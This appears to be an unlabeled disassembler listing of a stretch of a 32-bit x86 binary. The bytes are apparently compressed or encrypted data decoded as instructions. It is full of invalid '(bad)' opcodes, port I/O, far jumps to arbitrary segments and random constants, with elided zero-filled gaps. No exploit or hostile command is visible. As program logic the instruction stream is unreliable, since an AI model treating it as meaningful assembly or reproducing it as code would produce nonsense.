  41b44c:	mov    gs,WORD PTR [eax-0x5c3aafe3]
  41b452:	in     eax,0x7e
  41b454:	xchg   esp,eax
  41b455:	and    eax,0x45b6a06
  41b45a:	and    BYTE PTR [ecx+0x58],0x8
  41b45e:	(bad)  
  41b45f:	(bad)  
  41b460:	mov    ds:0x9b7edf4d,al
  41b465:	stc    
  41b466:	js     0x41b417
  41b468:	(bad)  
  41b469:	fisub  DWORD PTR [ebx+0x5d]
  41b46c:	cdq    
  41b46d:	aam    0x69
  41b46f:	adc    DWORD PTR [esi+ebx*1-0x1],0xda90abda
  41b477:	xor    BYTE PTR [ecx-0x22ab6b44],dh
  41b47d:	mov    ecx,0x5be0b315
  41b482:	pop    ebx
  41b483:	out    dx,eax
  41b484:	push   ss
  41b485:	dec    esi
  41b486:	js     0x41b49a
  41b488:	mov    dl,0x94
  41b48a:	outs   dx,BYTE PTR ds:[esi]
  41b48b:	ret    0xd5be
  41b48e:	mov    ds:0x32544c45,al
  41b493:	jmp    0x756:0x16af38a3
  41b49a:	sub    esi,eax
  41b49c:	in     eax,0x98
  41b49e:	mov    DWORD PTR [ebp+0x6d9e064c],edx
  41b4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4a5:	push   ebx
  41b4a6:	loopne 0x41b441
  41b4a8:	(bad)  [eax]
  41b4aa:	push   eax
  41b4ab:	mov    BYTE PTR [edi],bh
  41b4ad:	xchg   edi,eax
  41b4ae:	cmp    esi,ebp
  41b4b0:	mov    eax,ds:0xc4bfe00
  41b4b5:	xchg   esi,eax
  41b4b6:	shl    DWORD PTR [ebx],1
  41b4b8:	inc    esp
  41b4b9:	into   
  41b4ba:	jnp    0x41b4f0
  41b4bc:	jnp    0x41b501
  41b4be:	addr16 push 0x4c83e3da
  41b4c4:	(bad)  
  41b4c5:	pop    ebx
  41b4c6:	dec    esi
  41b4c7:	ror    BYTE PTR [eax+0x5f662226],cl
  41b4cd:	mov    ecx,DWORD PTR [edx+0x5e]
  41b4d0:	lahf   
  41b4d1:	xchg   edx,eax
  41b4d2:	mov    DWORD PTR es:[ecx+0xd],eax
  41b4d6:	dec    edx
  41b4d7:	adc    esi,ebp
  41b4d9:	cdq    
  41b4da:	inc    esp
  41b4db:	mov    bl,0x36
  41b4dd:	or     DWORD PTR [ebp-0x6e],ebp
  41b4e0:	out    0x95,eax
  41b4e2:	ins    DWORD PTR es:[edi],dx
  41b4e3:	imul   esi,ebp,0x1fdde31f
  41b4e9:	jb     0x41b4f8
  41b4eb:	imul   ecx,DWORD PTR [edi+0x2a],0xffffffaa
  41b4ef:	add    cl,BYTE PTR cs:0x816fbe7
  41b4f6:	cmp    ebp,DWORD PTR [esp+esi*8]
  41b4f9:	mov    bh,ch
  41b4fb:	or     BYTE PTR ds:0x9d222126,bl
  41b501:	adc    ebp,edi
  41b503:	pop    edi
  41b504:	push   esi
  41b505:	add    BYTE PTR [edx],cl
  41b507:	mov    ds:0xa305fe62,al
  41b50c:	aam    0xd2
  41b50e:	inc    edi
  41b50f:	jo     0x41b511
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	(bad)  
  41b582:	cli    
  41b583:	cmp    BYTE PTR [eax],bl
  41b585:	and    al,BYTE PTR [ecx]
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	jmp    0x4597b223
  41b591:	and    eax,0xf9f1b68a
  41b596:	call   0xc565:0xffb2a137
  41b59d:	test   DWORD PTR [edi],0xe5087d7
  41b5a3:	fdiv   DWORD PTR [edi+0x64]
  41b5a6:	sahf   
  41b5a7:	mov    ebx,0xce170e0e
  41b5ac:	push   eax
  41b5ad:	(bad)  
  41b5ae:	or     BYTE PTR [ecx],ah
  41b5b0:	sub    ah,al
  41b5b2:	in     al,0x9c
  41b5b4:	lea    eax,[esi+esi*2-0x7d006a0d]
  41b5bb:	jne    0x41b5ad
  41b5bd:	cld    
  41b5be:	loope  0x41b570
  41b5c0:	daa    
  41b5c1:	pop    ds
  41b5c2:	push   esi
  41b5c3:	dec    ebp
  41b5c4:	mov    DWORD PTR [ebp-0x33],0x78a7d885
  41b5cb:	je     0x41b60a
  41b5cd:	lock jmp 0x8214a7
  41b5d3:	sub    esp,DWORD PTR [ebp-0x33]
  41b5d6:	cmp    eax,0xc8f1cfca
  41b5db:	scas   al,BYTE PTR es:[edi]
  41b5dc:	inc    edx
  41b5dd:	popf   
  41b5de:	push   edx
  41b5df:	and    DWORD PTR [edx+0x15],ebx
  41b5e2:	mov    eax,esi
  41b5e4:	xor    eax,0x6a46da79
  41b5e9:	adc    eax,0xbcd73d59
  41b5ee:	mov    ebx,0x22db8ae4
  41b5f3:	(bad)  
  41b5f4:	fistp  WORD PTR [edi+0x12]
  41b5f7:	add    eax,0x1dcce280
  41b5fc:	dec    ecx
  41b5fd:	(bad)  
  41b5ff:	push   ss
  41b600:	(bad)  
  41b601:	rcr    ecx,cl
  41b603:	xor    DWORD PTR [edi+0x157161f4],0x1f
  41b60a:	add    eax,0xaee38f7b
  41b60f:	les    eax,FWORD PTR [edx]
  41b611:	lds    esi,FWORD PTR [ebx]
  41b613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b614:	mov    ebp,DWORD PTR [esi+0x55aef5ad]
  41b61a:	imul   edx,DWORD PTR [eax],0x23400816
  41b620:	out    dx,eax
  41b621:	push   ecx
  41b622:	inc    esi
  41b623:	out    0xa0,eax
  41b625:	jecxz  0x41b60c
  41b627:	imul   ebx,DWORD PTR [esi],0x8a45b2fc
  41b62d:	xchg   BYTE PTR [ecx+0x2e3ba0db],ch
  41b633:	add    ebp,edi
  41b635:	xchg   esp,eax
  41b636:	in     al,0xb2
  41b638:	scas   al,BYTE PTR es:[edi]
  41b639:	jae    0x41b648
  41b63b:	retf   0xbaf7
  41b63e:	(bad)  
  41b63f:	jge    0x41b5c5
  41b641:	mov    bh,0xfe
  41b643:	cmc    
  41b644:	leave  
  41b645:	fsubr  DWORD PTR [edi-0x525f0d04]
  41b64b:	shr    ah,0xc8
  41b64e:	in     eax,0xa4
  41b650:	jae    0x41b6cb
  41b652:	xchg   edx,eax
  41b653:	dec    al
  41b655:	add    DWORD PTR [ecx-0x17f2554b],0x53894021
  41b65f:	fwait
  41b660:	shl    ah,cl
  41b662:	popa   
  41b663:	and    eax,0xd76a1f42
  41b668:	cmp    al,0x28
  41b66a:	out    0xb0,eax
  41b66c:	aaa    
  41b66d:	xchg   ebp,eax
  41b66e:	mov    esi,esi
  41b670:	cmp    eax,0x10c21c68
  41b675:	std    
  41b676:	and    esp,DWORD PTR [ecx]
  41b678:	fistp  QWORD PTR [edi+0x6ef33a31]
  41b67e:	xor    eax,0x21257f29
  41b683:	adc    bl,BYTE PTR [eax]
  41b685:	cs mov bh,0xc2
  41b688:	loop   0x41b63e
  41b68a:	retf   
  41b68b:	clc    
  41b68c:	repz call 0x42b676
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	sti    
  41b701:	inc    DWORD PTR [edi+eiz*8]
  41b704:	sbb    al,0x23
  41b706:	add    DWORD PTR [eax],eax
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	ret    0xf85e
  41b70f:	lods   eax,DWORD PTR ds:[esi]
  41b710:	je     0x41b726
  41b712:	data16 cld 
  41b714:	(bad)  
  41b715:	outs   dx,DWORD PTR ds:[esi]
  41b716:	xchg   esi,eax
  41b717:	add    eax,0xda06a1c7
  41b71c:	mov    cs,WORD PTR [edx-0x31]
  41b71f:	mov    bl,0xa6
  41b721:	add    eax,0xc645b9b
  41b726:	push   ecx
  41b727:	sub    eax,0xa6eeae8d
  41b72c:	mov    ecx,0xb6988103
  41b731:	sbb    edi,DWORD PTR [ebx]
  41b733:	jnp    0x41b747
  41b735:	mov    esi,0xa5b7f9b
  41b73a:	call   0xbc6f:0x53b5e338
  41b741:	pushf  
  41b742:	scas   eax,DWORD PTR es:[edi]
  41b743:	pop    ss
  41b744:	dec    DWORD PTR [edi]
  41b746:	xchg   ecx,eax
  41b747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b748:	xor    BYTE PTR [eax+0x4f906306],cl
  41b74e:	ins    BYTE PTR es:[edi],dx
  41b74f:	call   0x8218:0x1e29f421
  41b756:	push   0xffffffa4
  41b758:	xchg   ecx,eax
  41b759:	mov    bl,0xae
  41b75b:	in     eax,0xe7
  41b75d:	je     0x41b6e4
  41b75f:	mov    ah,0x72
  41b761:	jns    0x41b738
  41b763:	push   0x3e
  41b765:	lea    ecx,[edx-0x1]
  41b768:	inc    ebx
  41b769:	inc    edi
  41b76a:	sbb    DWORD PTR [ebx+0x104b87e0],esp
  41b770:	inc    ecx
  41b771:	shl    DWORD PTR [esi+ebx*8+0x34232245],cl
  41b778:	pushf  
  41b779:	jo     0x41b77d
  41b77b:	add    al,0x7a
  41b77d:	adc    al,0x70
  41b77f:	and    BYTE PTR [edi-0x34],ch
  41b782:	scas   al,BYTE PTR es:[edi]
  41b783:	cli    
  41b784:	pop    ds
  41b785:	(bad)  ds:0x392551
  41b78b:	mov    ds:0xbfbd76f7,eax
  41b790:	scas   eax,DWORD PTR es:[edi]
  41b791:	cld    
  41b792:	pop    edi
  41b793:	inc    ecx
  41b794:	cld    
  41b795:	push   es
  41b796:	xchg   esp,eax
  41b797:	in     eax,0x63
  41b799:	inc    edi
  41b79a:	jecxz  0x41b74c
  41b79c:	ss aaa 
  41b79e:	les    esp,FWORD PTR [esi+eax*2-0x6e]
  41b7a2:	(bad)  
  41b7a3:	jmp    0x41b774
  41b7a5:	jmp    0xdfdd:0x5e5e85b2
  41b7ac:	jmp    0x41b80f
  41b7ae:	adc    esp,ebx
  41b7b0:	ds xor eax,0x505a2d17
  41b7b6:	outs   dx,DWORD PTR ds:[esi]
  41b7b7:	mov    ecx,0x56040406
  41b7bc:	push   ecx
  41b7bd:	cli    
  41b7be:	xor    DWORD PTR [ebx],0x14582500
  41b7c4:	mov    al,0x7e
  41b7c6:	jb     0x41b7ed
  41b7c8:	out    dx,eax
  41b7c9:	inc    esp
  41b7ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7cb:	ror    DWORD PTR [ebp-0x6b],cl
  41b7ce:	fidiv  DWORD PTR [ecx+eiz*2-0x1f]
  41b7d2:	je     0x41b808
  41b7d4:	test   DWORD PTR [edi],ebp
  41b7d6:	sar    DWORD PTR [ecx+0x38],0x6c
  41b7da:	pop    eax
  41b7db:	mov    DWORD PTR [ebx+esi*2+0x5],ebx
  41b7df:	dec    edi
  41b7e0:	aad    0x5d
  41b7e2:	jmp    FWORD PTR [edx-0x5]
  41b7e5:	xor    al,0xc6
  41b7e7:	loopne 0x41b7f4
  41b7e9:	add    ah,dl
  41b7eb:	and    al,0x90
  41b7ed:	and    esp,edi
  41b7ef:	sub    dl,BYTE PTR [ebp+0x4d]
  41b7f2:	repz imul ebp,DWORD PTR [edi-0x4f9cb4d],0xffffffa6
  41b7fa:	nop
  41b7fb:	cmp    ah,dl
  41b7fd:	mov    al,0xb0
  41b7ff:	add    al,BYTE PTR [esi-0x1d]
  41b802:	add    eax,DWORD PTR [ebp+0x4c]
  41b805:	mov    esi,0xd163af87
  41b80a:	js     0x41b79f
  41b80c:	imul   esi,DWORD PTR ss:[ecx+0x37],0x0
	...
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x40
  41b881:	xchg   esp,eax
  41b882:	jns    0x41b8e1
  41b884:	and    BYTE PTR [ecx+eax*1],ah
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	cli    
  41b88d:	xchg   ebx,eax
  41b88e:	xchg   ecx,eax
  41b88f:	shr    esi,1
  41b891:	retf   0xf666
  41b894:	push   edx
  41b895:	sub    BYTE PTR [ebx-0x6],al
  41b898:	std    
  41b899:	jmp    0x41b903
  41b89b:	pop    esp
  41b89c:	in     al,dx
  41b89d:	xor    ecx,ebp
  41b89f:	xchg   edx,eax
  41b8a0:	jne    0x41b8ef
  41b8a2:	jecxz  0x41b8db
  41b8a4:	cmpps  xmm0,XMMWORD PTR [ebp-0x707a6fef],0x93
  41b8ac:	stos   BYTE PTR es:[edi],al
  41b8ad:	xchg   DWORD PTR [esp+edi*8],edx
  41b8b0:	pop    ecx
  41b8b1:	imul   ecx,DWORD PTR [esi+eax*8],0x16
  41b8b5:	stc    
  41b8b6:	sbb    DWORD PTR [edi],edx
  41b8b8:	loop   0x41b89a
  41b8ba:	xchg   ecx,eax
  41b8bb:	mov    ecx,0x7252b6
  41b8c0:	xor    eax,0x57f9ccf8
  41b8c5:	cdq    
  41b8c6:	cmc    
  41b8c7:	lahf   
  41b8c8:	das    
  41b8c9:	pop    ss
  41b8ca:	xchg   esi,eax
  41b8cb:	clc    
  41b8cc:	test   BYTE PTR [edi-0x36990442],bl
  41b8d2:	mov    BYTE PTR [edx+0xc397614],ch
  41b8d8:	outs   dx,BYTE PTR ds:[esi]
  41b8d9:	ja     0x41b8aa
  41b8db:	mov    cl,0x25
  41b8dd:	sbb    esi,DWORD PTR [edx]
  41b8df:	sti    
  41b8e0:	int    0xeb
  41b8e2:	mul    ebp
  41b8e4:	inc    ebx
  41b8e5:	mov    ds:0x178371b2,al
  41b8ea:	lahf   
  41b8eb:	lods   al,BYTE PTR ds:[esi]
  41b8ec:	pushf  
  41b8ed:	dec    edi
  41b8ee:	ret    
  41b8ef:	loop   0x41b941
  41b8f1:	xor    BYTE PTR [esp+edi*4+0x1d],dh
  41b8f5:	sub    al,ah
  41b8f7:	add    al,0x54
  41b8f9:	mov    ebx,0xfb83595c
  41b8fe:	stos   DWORD PTR es:[edi],eax
  41b8ff:	dec    eax
  41b900:	mov    esi,0x7e1863ed
  41b905:	jno    0x41b97e
  41b907:	add    al,0xd1
  41b909:	les    edi,FWORD PTR [ecx+0x5c]
  41b90c:	or     edi,eax
  41b90e:	enter  0xc5a3,0x0
  41b912:	mov    al,0xc5
  41b914:	cli    
  41b915:	add    eax,0x2509a76c
  41b91a:	das    
  41b91b:	and    DWORD PTR [esi],esi
  41b91d:	rol    WORD PTR ds:0x81966303,1
  41b924:	fadd   DWORD PTR ds:[ecx-0x3188e94d]
  41b92b:	xchg   edi,eax
  41b92c:	test   eax,esp
  41b92e:	scas   eax,DWORD PTR es:[edi]
  41b92f:	leave  
  41b930:	(bad)  
  41b931:	and    al,0xea
  41b933:	(bad)  
  41b934:	sti    
  41b935:	dec    esi
  41b936:	scas   al,BYTE PTR es:[edi]
  41b937:	cli    
  41b938:	cwde   
  41b939:	mov    esp,0x67f4a92c
  41b93e:	mov    esi,0xfb22c182
  41b944:	es ins BYTE PTR es:[edi],dx
  41b946:	add    edi,DWORD PTR ds:0x881f1e54
  41b94c:	mov    bh,0xe
  41b94e:	idiv   cl
  41b950:	xchg   edx,eax
  41b951:	cs pop ebp
  41b953:	xor    BYTE PTR [esi],0x81
  41b956:	jmp    0xeeb6c29c
  41b95b:	clc    
  41b95c:	mov    BYTE PTR [ebx+edx*8-0x71],al
  41b960:	stos   BYTE PTR es:[edi],al
  41b961:	cs out 0xac,al
  41b964:	in     eax,0xc6
  41b966:	call   0xe13d:0xbf279ccc
  41b96d:	(bad)  
  41b96e:	sbb    ecx,ebx
  41b970:	mov    eax,ds:0x8dfacfdc
  41b975:	(bad)  
  41b976:	pop    edx
  41b977:	cmp    al,0x3a
  41b979:	cs jmp 0x41b9b8
  41b97c:	pop    edi
  41b97d:	dec    edi
  41b97e:	aaa    
  41b97f:	sub    edx,ebx
  41b981:	push   ebx
  41b982:	or     DWORD PTR [eax-0x1a],esi
  41b985:	adc    bh,dh
  41b987:	push   ds
  41b988:	jmp    0xad27:0x39f7f9d5
  41b98f:	pop    ds
	...
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	add    eax,0x24fc88a1
  41ba05:	and    eax,0x1040001
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	mov    al,bl
  41ba0e:	mov    bh,bh
  41ba10:	sub    esp,ebp
  41ba12:	dec    edi
  41ba13:	xchg   BYTE PTR [si+0x53],ch
  41ba17:	nop
  41ba18:	jle    0x41ba66
  41ba1a:	inc    ebp
  41ba1b:	cmp    eax,0xd629c3c5
  41ba20:	jae    0x41ba1a
  41ba22:	ja     0x41ba4b
  41ba24:	mov    al,gs:0xb6fcfdd0
  41ba2a:	into   
  41ba2b:	ret    0xe362
  41ba2e:	mov    eax,ds:0x42e7ee51
  41ba33:	jbe    0x41ba2d
  41ba35:	sbb    al,0xd4
  41ba37:	out    0x3a,al
  41ba39:	std    
  41ba3a:	pop    ebp
  41ba3b:	push   cs
  41ba3c:	or     eax,0xfc314288
  41ba41:	pusha  
  41ba42:	push   ebp
  41ba43:	mov    dl,0xac
  41ba45:	mov    dh,0x63
  41ba47:	mov    ds:0xd21257a,al
  41ba4c:	sub    eax,0x66edd362
  41ba51:	in     eax,0x2b
  41ba53:	scas   al,BYTE PTR es:[edi]
  41ba54:	rcl    bl,0x96
  41ba57:	mov    ebp,0x7843f4c8
  41ba5c:	mov    ebx,0xf3b05ecc
  41ba61:	dec    esi
  41ba62:	pop    ds
  41ba63:	sbb    cl,BYTE PTR [edi]
  41ba65:	dec    eax
  41ba66:	stos   DWORD PTR es:[edi],eax
  41ba67:	push   ds
  41ba68:	mov    ebp,DWORD PTR [ecx]
  41ba6a:	mov    eax,0xd904a59e
  41ba6f:	cmp    BYTE PTR [esi+0xba990fc],bl
  41ba75:	in     eax,dx
  41ba76:	in     eax,0x16
  41ba78:	xchg   BYTE PTR ds:0x5c98ed8e,al
  41ba7e:	push   ds
  41ba7f:	fiadd  WORD PTR [edi]
  41ba81:	int3   
  41ba82:	add    ecx,ecx
  41ba84:	out    dx,al
  41ba85:	ret    0x6c99
  41ba88:	cmp    bl,ah
  41ba8a:	scas   eax,DWORD PTR es:[edi]
  41ba8b:	dec    edi
  41ba8c:	adc    BYTE PTR [ebx-0x7d501568],al
  41ba92:	int    0xf
  41ba94:	xor    eax,0xdc1978fe
  41ba99:	or     eax,DWORD PTR [edi-0x40a46a4a]
  41ba9f:	and    DWORD PTR [ecx+eax*8],0xf4ef961
  41baa6:	push   edx
  41baa7:	jge    0x41babb
  41baa9:	push   ecx
  41baaa:	cmp    al,0x9d
  41baac:	dec    eax
  41baad:	pop    esp
  41baae:	mov    dh,0x30
  41bab0:	sti    
  41bab1:	xchg   esp,eax
  41bab2:	jmp    0x41ba57
  41bab4:	jbe    0x41ba4a
  41bab6:	es (bad) 
  41bab8:	jo     0x41ba88
  41baba:	sub    ebx,eax
  41babc:	icebp  
  41babd:	inc    eax
  41babe:	cmp    al,0xec
  41bac0:	pop    ecx
  41bac1:	jge    0x41babf
  41bac3:	xchg   edi,eax
  41bac4:	cmp    BYTE PTR [edi+0x4],0x7e
  41bac8:	push   esp
  41bac9:	mov    DWORD PTR [esi+edi*4-0x296b0571],ebp
  41bad0:	or     eax,0xb08a4f8
  41bad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bad6:	scas   al,BYTE PTR es:[edi]
  41bad7:	add    esi,DWORD PTR [ecx-0x133192b6]
  41badd:	sar    BYTE PTR [edi],cl
  41badf:	sbb    eax,0xdc9ea9bc
  41bae4:	int3   
  41bae5:	mov    WORD PTR [edi],ds
  41bae7:	or     esi,DWORD PTR [eax+0x6ebf10b9]
  41baed:	sbb    al,0xb6
  41baef:	adc    ch,dh
  41baf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baf3:	inc    esp
  41baf4:	test   eax,0xf7937721
  41baf9:	popf   
  41bafa:	cmp    ecx,esp
  41bafc:	pop    ecx
  41bafd:	xchg   edx,eax
  41bafe:	push   eax
  41baff:	in     al,0x85
  41bb01:	div    dh
  41bb03:	ins    BYTE PTR es:[edi],dx
  41bb04:	(bad)  
  41bb05:	cs shr ebp,cl
  41bb08:	(bad)  
  41bb09:	fs out 0xe7,eax
  41bb0c:	fucomi st,st(0)
  41bb0e:	push   ecx
  41bb0f:	pop    eax
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x7a],cx
  41bb81:	mov    ds:0x262805a6,al
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	lock cmc 
  41bb8e:	scas   al,BYTE PTR es:[edi]
  41bb8f:	mov    eax,ds:0x47df7db1
  41bb94:	out    dx,al
  41bb95:	sub    ebx,0xffffff88
  41bb98:	inc    esp
  41bb99:	aaa    
  41bb9a:	inc    esp
  41bb9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb9c:	sti    
  41bb9d:	add    al,0x8a
  41bb9f:	in     al,0xb6
  41bba1:	cmp    al,BYTE PTR [esp+edi*1-0x56f36ee2]
  41bba8:	cmp    eax,eax
  41bbaa:	jnp    0x41bbca
  41bbac:	test   DWORD PTR [esi+0x34474467],0x7425aa5d
  41bbb6:	leave  
  41bbb7:	rcl    edi,cl
  41bbb9:	lods   al,BYTE PTR ds:[esi]
  41bbba:	sti    
  41bbbb:	xchg   edx,eax
  41bbbc:	adc    eax,0xc76e28bb
  41bbc1:	push   cs
  41bbc2:	outs   dx,DWORD PTR ds:[esi]
  41bbc3:	add    BYTE PTR [ecx],dh
  41bbc5:	xchg   BYTE PTR [ecx-0x5669341f],cl
  41bbcb:	daa    
  41bbcc:	lock xor DWORD PTR [edx+eiz*1+0x5c],0x2810fdac
  41bbd5:	cmp    bl,BYTE PTR [eax]
  41bbd7:	xchg   DWORD PTR [ebp-0x67],ebp
  41bbda:	add    edi,DWORD PTR ds:0xfe566dc5
  41bbe0:	jbe    0x41bbd2
  41bbe2:	pop    ebx
  41bbe3:	iret   
  41bbe4:	aam    0x38
  41bbe6:	xchg   edx,eax
  41bbe7:	adc    edx,DWORD PTR [ebp-0x2fd456af]
  41bbed:	(bad)  
  41bbee:	repnz inc esp
  41bbf0:	xchg   edi,eax
  41bbf1:	ret    
  41bbf2:	inc    edx
  41bbf3:	(bad)  
  41bbf4:	adc    DWORD PTR [edi],eax
  41bbf6:	push   eax
  41bbf7:	aam    0x7a
  41bbf9:	inc    ebp
  41bbfa:	fcom   DWORD PTR [ebx-0x33]
  41bbfd:	inc    edx
  41bbfe:	xor    BYTE PTR [edx],0x7c
  41bc01:	addr16 repz addr16 inc esi
  41bc05:	mov    eax,ds:0x6092a885
  41bc0a:	pop    ebx
  41bc0b:	push   ss
  41bc0c:	hlt    
  41bc0d:	stos   DWORD PTR es:[edi],eax
  41bc0e:	aad    0xcd
  41bc10:	out    0xf2,al
  41bc12:	dec    esp
  41bc13:	imul   ecx,DWORD PTR [ecx+0x36],0xffffffe1
  41bc17:	jne    0x41bbea
  41bc19:	and    bh,dl
  41bc1b:	aaa    
  41bc1c:	pushf  
  41bc1d:	push   cs
  41bc1e:	jnp    0x41bc10
  41bc20:	cmp    bh,BYTE PTR [ebp-0x4c]
  41bc23:	ins    BYTE PTR es:[edi],dx
  41bc24:	sbb    eax,0xbe7ce544
  41bc29:	inc    ebx
  41bc2a:	pop    edx
  41bc2b:	lock inc edi
  41bc2d:	fld    st(6)
  41bc2f:	inc    ebp
  41bc30:	mov    esp,0x663ab899
  41bc35:	sub    eax,0xf8ea586d
  41bc3a:	retf   
  41bc3b:	shl    DWORD PTR [ebp+0x7b],1
  41bc3e:	sbb    al,0x13
  41bc40:	scas   al,BYTE PTR es:[edi]
  41bc41:	mov    cl,0x69
  41bc43:	add    eax,0xe3293e80
  41bc48:	push   ebx
  41bc49:	addr16 push es
  41bc4b:	xchg   ebx,eax
  41bc4c:	retf   0x259d
  41bc4f:	ffree  st(3)
  41bc51:	popf   
  41bc52:	add    DWORD PTR [esi-0x2f2107fd],0xffffffd2
  41bc59:	or     bh,BYTE PTR [esp+edx*8-0x6274ce7b]
  41bc60:	xor    al,0xcb
  41bc62:	aam    0xc8
  41bc64:	mov    al,0x65
  41bc66:	cmp    ch,BYTE PTR [ecx+0x55]
  41bc69:	clc    
  41bc6a:	mov    edx,0x6700aec4
  41bc6f:	and    BYTE PTR [edi-0x5ac838b1],ch
  41bc75:	fsub   QWORD PTR [ebx+0x5c366254]
  41bc7b:	push   ss
  41bc7c:	add    DWORD PTR [edi],edi
  41bc7e:	ja     0x41bce3
  41bc80:	mov    ecx,0x31e1cb17
  41bc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc86:	and    bl,BYTE PTR [edi]
  41bc88:	nop
  41bc89:	or     eax,0x1582920f
  41bc8e:	jmp    0x0:0x20
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x773bd9d8
  41bd02:	(bad)  
  41bd04:	sub    al,0x27
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	adc    BYTE PTR [ecx],0x6e
  41bd0f:	loop   0x41bccd
  41bd11:	imul   esi,DWORD PTR [ecx+ecx*1+0x4b2aa269],0xffffffe9
  41bd19:	fsubp  st(4),st
  41bd1b:	js     0x41bd41
  41bd1d:	ror    BYTE PTR [ebx],0xa7
  41bd20:	lods   al,BYTE PTR ds:[esi]
  41bd21:	pop    ds
  41bd22:	dec    esi
  41bd23:	test   DWORD PTR [eax+edi*2-0x9],eax
  41bd27:	pushf  
  41bd28:	les    esi,FWORD PTR [edx+0x507cbb15]
  41bd2e:	mov    fs,WORD PTR [ebx+ecx*4-0x5fe6a76b]
  41bd35:	gs pop ebx
  41bd37:	inc    esi
  41bd38:	lods   al,BYTE PTR ds:[esi]
  41bd39:	pop    edi
  41bd3a:	cmp    al,0x7d
  41bd3c:	inc    esi
  41bd3d:	xor    al,0x25
  41bd3f:	xchg   edi,eax
  41bd40:	(bad)  
  41bd42:	(bad)  
  41bd43:	jge    0x41bd01
  41bd45:	outs   dx,BYTE PTR ds:[esi]
  41bd46:	pop    ss
  41bd47:	add    al,0x8b
  41bd49:	repnz or edx,ebp
  41bd4c:	jne    0x41bdc5
  41bd4e:	and    eax,0xfda44e18
  41bd53:	scas   al,BYTE PTR es:[edi]
  41bd54:	push   0x48
  41bd56:	jg     0x41bd3f
  41bd58:	(bad)  
  41bd59:	mov    edx,0x1dc9d114
  41bd5e:	test   al,0xe8
  41bd60:	shl    DWORD PTR [edx-0x5eaad984],0x33
  41bd67:	data16 mov ?,WORD PTR [eax]
  41bd6a:	or     bh,dh
  41bd6c:	sub    bh,BYTE PTR [edx-0xc023e3e]
  41bd72:	test   DWORD PTR [ecx],esp
  41bd74:	ds mov esp,0xf9fd2001
  41bd7a:	cli    
  41bd7b:	push   eax
  41bd7c:	or     DWORD PTR ss:[edx-0x7425bd62],esp
  41bd83:	in     al,0xc0
  41bd85:	loop   0x41bd15
  41bd87:	sar    DWORD PTR [ecx],1
  41bd89:	lea    ebx,[edx]
  41bd8b:	and    ah,BYTE PTR [edi-0x5ed6229c]
  41bd91:	loopne 0x41bd38
  41bd93:	xchg   esi,eax
  41bd94:	adc    dl,BYTE PTR [ecx-0x10]
  41bd97:	mov    ebx,0xbc0f4339
  41bd9c:	mov    esp,0x90056dc4
  41bda1:	or     BYTE PTR [edx+0x140ddd57],dl
  41bda7:	add    esp,DWORD PTR [edi-0x7d470d6c]
  41bdad:	pusha  
  41bdae:	inc    eax
  41bdaf:	or     eax,0x3c493055
  41bdb4:	gs inc ebp
  41bdb6:	mov    esi,0xe12cbbb5
  41bdbb:	fstp   QWORD PTR [ecx-0x17c445b5]
  41bdc1:	shl    esi,1
  41bdc3:	xchg   edx,eax
  41bdc4:	loopne 0x41be17
  41bdc6:	scas   al,BYTE PTR es:[edi]
  41bdc7:	jmp    0x41bd53
  41bdc9:	xchg   esi,eax
  41bdca:	jmp    0x7b92589e
  41bdcf:	pop    ecx
  41bdd0:	ins    BYTE PTR es:[edi],dx
  41bdd1:	sbb    ch,dh
  41bdd3:	aaa    
  41bdd4:	jle    0x41bdc8
  41bdd6:	xchg   BYTE PTR [esi+0x2b],ch
  41bdd9:	push   eax
  41bdda:	data16 lods al,BYTE PTR ds:[esi]
  41bddc:	or     al,0xaf
  41bdde:	adc    al,0x2
  41bde0:	fbstp  TBYTE PTR [eax]
  41bde2:	pusha  
  41bde3:	add    edx,DWORD PTR [esi+0x5]
  41bde6:	lods   eax,DWORD PTR ds:[esi]
  41bde7:	jge    0x41be5c
  41bde9:	sbb    BYTE PTR [edi+0x6888b4b9],ch
  41bdef:	ins    DWORD PTR es:[edi],dx
  41bdf0:	and    edx,DWORD PTR [esi]
